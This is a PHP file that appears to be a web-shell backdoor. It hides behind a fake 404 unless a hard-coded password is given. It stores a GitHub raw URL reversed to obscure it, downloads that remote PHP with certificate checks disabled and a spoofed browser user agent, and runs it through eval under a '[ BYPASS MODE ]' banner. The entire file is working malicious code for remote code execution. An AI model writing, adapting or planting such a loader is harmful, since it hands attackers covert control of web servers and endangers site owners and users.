<?php
$pass = "Lulz1337";

if (!isset($_GET['p']) || $_GET['p'] !== $pass) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

$z = "php.2/niam/sdaeh/sfer/mpo/mpyfful/moc.tnebnetnocubhtig.war//:sptth";
$u = strrev($z);

echo '<div style="position:fixed;top:10px;right:10px;z-index:9999;background:#1a1a1a;color:#eee;padding:15px;border-radius:8px;border:2px solid #ff0000;font-family:sans-serif;width:280px;">';
echo '<b style="color:#ff0000;">[ BYPASS MODE ]</b><br>';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $u);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
// Menyamar sebagai Browser Chrome di Windows
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

$r = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);

if ($r) {
    echo '<span style="color:#2ecc71;">● Connection Success</span><br>';
    eval("?>" . $r);
} else {
    echo '<span style="color:#e74c3c;">● Still Blocked by Server</span><br>';
    echo '<small>HTTP Code: ' . $info['http_code'] . '</small>';
}

echo '</div>';
?>
